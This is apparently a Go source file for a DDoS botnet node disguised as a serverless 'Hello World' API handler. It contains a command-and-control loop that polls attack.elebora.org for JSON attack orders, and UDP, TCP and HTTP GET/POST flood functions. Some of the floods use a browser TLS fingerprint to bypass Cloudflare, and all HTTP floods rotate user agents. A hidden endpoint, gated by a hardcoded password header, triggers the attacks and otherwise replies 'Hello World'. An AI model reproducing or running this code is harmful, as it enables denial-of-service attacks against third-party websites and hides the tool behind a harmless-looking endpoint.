package handler

import (
	crypto_rand "crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"sync"
	"time"

	httpf "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"
	"github.com/bogdanfinn/tls-client/profiles"
	"github.com/labstack/echo/v4"
	"github.com/labstack/echo/v4/middleware"
)

var (
	HashManager = make(map[string]bool)

	user_agent = []string{
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
		"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
		"Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
		"Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
		"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16",
		"Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4",
		"Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
		"Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",
		"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2",
		"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
	}
)

type Attack struct {
	Host   string `json:"host"`
	Thread int    `json:"thread"`
	Method string `json:"method"`
	Hash   string `json:"hash"`
}

type AttackManager struct {
	Managers map[string]*Attack
}

func Read(conn net.Conn) ([]byte, error) {
	var bytes []byte
	for {
		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		if err != nil {
			return nil, err
		}
		bytes = append(bytes, buf[:n]...)
		if len(buf) != n {
			return bytes, nil
		}
	}
}

func Rule() {
	for {
		ip, err := net.LookupHost("attack.elebora.org")
		if err != nil {
			fmt.Println(err)
			continue
		}

		for {
			conn, err := net.Dial("tcp", ip[0]+":90")
			if err != nil {
				fmt.Println(err)
				time.Sleep(1 * time.Second)
				continue
			}

			for {

				buf, err := Read(conn)
				if err != nil {
					fmt.Println(err)
					continue
				}
				var Attacks AttackManager

				err = json.Unmarshal(buf, &Attacks)
				if err != nil {
					fmt.Println(err)
					return
				}

				Role(Attacks)
			}
		}
	}
}

func Role(Attack AttackManager) {
	var wg sync.WaitGroup
	for _, value := range Attack.Managers {
		switch value.Method {
		case "GET":
			wg.Add(1)
			go GET(value.Host, value.Thread, &wg)
		case "POST":
			wg.Add(1)
			go POST(value.Host, value.Thread, &wg)
		case "CF-GET":
			wg.Add(1)
			go CF_GET(value.Host, value.Thread, &wg)
		case "CF-POST":
			wg.Add(1)
			go CF_POST(value.Host, value.Thread, &wg)
		case "TCP":
			wg.Add(1)
			go TCP(value.Host, value.Thread, &wg)
		case "UDP":
			wg.Add(1)
			go UDP(value.Host, value.Thread, &wg)
		}
	}
	wg.Wait()
}

func UDP(Host string, Thread int, wgs *sync.WaitGroup) {
	defer wgs.Done()
	var wg sync.WaitGroup
	for i := 0; i <= Thread; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			buffer := make([]byte, 1024)
			conn, err := net.Dial("udp", Host)
			if err != nil {
				fmt.Println(err)
				return
			}
			_, err = crypto_rand.Read(buffer)
			if err != nil {
				fmt.Println(err)
				return
			}
			conn.Write(buffer)
			conn.Close()
		}()
	}
	wg.Wait()
}

func TCP(Host string, Thread int, wgs *sync.WaitGroup) {
	defer wgs.Done()
	var wg sync.WaitGroup
	for i := 0; i <= Thread; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.Dial("tcp", Host)
			if err != nil {
				fmt.Println(err)
				return
			}
			conn.Close()
		}()
	}
	wg.Wait()
}

func GET(Host string, Thread int, wgs *sync.WaitGroup) {
	defer wgs.Done()
	var wg sync.WaitGroup
	for i := 0; i <= Thread; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := http.Client{}
			req, err := http.NewRequest(http.MethodGet, Host, nil)
			if err != nil {
				fmt.Println(err)
				return
			}
			req.Header.Set("Accept-Language", "ja,en-US;q=0.9,en;q=0.8")
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("User-Agent", user_agent[rand.Intn(len(user_agent))])
			client.Do(req)
		}()
	}
	wg.Wait()
}

func CF_GET(Host string, Thread int, wgs *sync.WaitGroup) {
	defer wgs.Done()
	var wg sync.WaitGroup
	for i := 0; i <= Thread; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			jar := tls_client.NewCookieJar()
			options := []tls_client.HttpClientOption{
				tls_client.WithTimeoutSeconds(30),
				tls_client.WithClientProfile(profiles.Chrome_105),
				tls_client.WithNotFollowRedirects(),
				tls_client.WithCookieJar(jar),
			}

			client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
			if err != nil {
				fmt.Println(err)
				return
			}
			req, err := httpf.NewRequest(http.MethodGet, Host, nil)
			if err != nil {
				fmt.Println(err)
				return
			}
			req.Header.Set("Accept-Language", "ja,en-US;q=0.9,en;q=0.8")
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("User-Agent", user_agent[rand.Intn(len(user_agent))])
			client.Do(req)
		}()
	}
	wg.Wait()
}

func POST(Host string, Thread int, wgs *sync.WaitGroup) {
	defer wgs.Done()
	var wg sync.WaitGroup
	for i := 0; i <= Thread; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := http.Client{}
			req, err := http.NewRequest(http.MethodPost, Host, nil)
			if err != nil {
				fmt.Println(err)
				return
			}
			req.Header.Set("Accept-Language", "ja,en-US;q=0.9,en;q=0.8")
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("User-Agent", user_agent[rand.Intn(len(user_agent))])
			client.Do(req)
		}()
	}
	wg.Wait()
}

func CF_POST(Host string, Thread int, wgs *sync.WaitGroup) {
	defer wgs.Done()
	var wg sync.WaitGroup
	for i := 0; i <= Thread; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			jar := tls_client.NewCookieJar()
			options := []tls_client.HttpClientOption{
				tls_client.WithTimeoutSeconds(30),
				tls_client.WithClientProfile(profiles.Chrome_105),
				tls_client.WithNotFollowRedirects(),
				tls_client.WithCookieJar(jar),
			}

			client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
			if err != nil {
				fmt.Println(err)
				return
			}
			req, err := httpf.NewRequest(http.MethodPost, Host, nil)
			if err != nil {
				fmt.Println(err)
				return
			}
			req.Header.Set("Accept-Language", "ja,en-US;q=0.9,en;q=0.8")
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("User-Agent", user_agent[rand.Intn(len(user_agent))])
			client.Do(req)
		}()
	}
	wg.Wait()
}

func Hello(c echo.Context) error {
	body, err := io.ReadAll(c.Request().Body)
	if err != nil {
		fmt.Println(err)
		return c.String(http.StatusOK, "Hello World")
	}
	password := c.Request().Header.Get("X-Password")
	if password != "ipRPBRzxxDjprV-RPSdBfKhM5B5-SLLQsCh5rBCYXTZMTaZtH8Ee6zu2YCAVzYQpmWtdQTiHWksNjBKepM3Jn2jRNAcisVykYKBf" {
		return c.String(http.StatusOK, "Hello World")
	}
	var Attacks AttackManager

	err = json.Unmarshal(body, &Attacks)
	if err != nil {
		fmt.Println(err)
		return c.String(http.StatusOK, "Hello World")
	}

	Role(Attacks)
	return c.String(http.StatusOK, "Attacked")
}

func Handler(w http.ResponseWriter, r *http.Request) {
	//go Rule()
	e := echo.New()
	e.Use(middleware.Logger())
	e.Use(middleware.Recover())
	e.GET("/api/hello", Hello)

	e.ServeHTTP(w, r)
}
